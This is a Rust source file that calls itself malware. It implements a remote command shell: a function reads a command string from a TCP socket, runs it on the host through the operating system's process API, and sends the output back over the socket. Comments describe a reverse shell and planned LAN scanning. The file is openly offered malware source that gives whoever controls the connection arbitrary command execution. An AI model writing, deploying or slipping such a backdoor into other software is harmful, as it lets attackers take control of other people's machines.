use std::{
    error::Error,
    process::{self, Stdio},
};

use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};

fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
    let mut args: Vec<&str> = command.split(" ").collect();
    let main_arg = args[0];

    let result = if args.len() > 1 {
        args = args.split_off(1);
        process::Command::new(main_arg)
            .args(args)
            .stdout(Stdio::piped())
            .output()?
    } else {
        process::Command::new(main_arg)
            .stdout(Stdio::piped())
            .output()?
    };
    let stdout = String::from_utf8(result.stdout.clone());
    let stderr = String::from_utf8(result.stderr.clone());
    println!("{:?}", stdout);
    println!("{:?}", stderr);
    Ok(result.stdout.into_boxed_slice())
}

pub async fn init(mut socket: TcpStream, time_left: usize) -> Result<Box<[u8]>, Box<dyn Error>> {
    // on run... do this:
    /*
     * 1. Detect what shells are on the machine
     * 2. print a nice little hello message
     * 3. see what other computers are running on a lan.
     * 4. print a goodbye message.
     * */
    println!("Hello there, i am malware!");

    //tokio can be used to spawn a server to create a reverse shell.
    let mut buffer = vec![];
    let time_left_msg = format!("Time Left: {time_left} seconds\n");
    socket.write_all(time_left_msg.as_bytes()).await?;
    _ = socket.read_to_end(&mut buffer).await;
    let input = String::from_utf8(buffer)?;
    let response = shell(input.trim())?;
    socket.write_all(&response).await?;
    Ok(response)
}
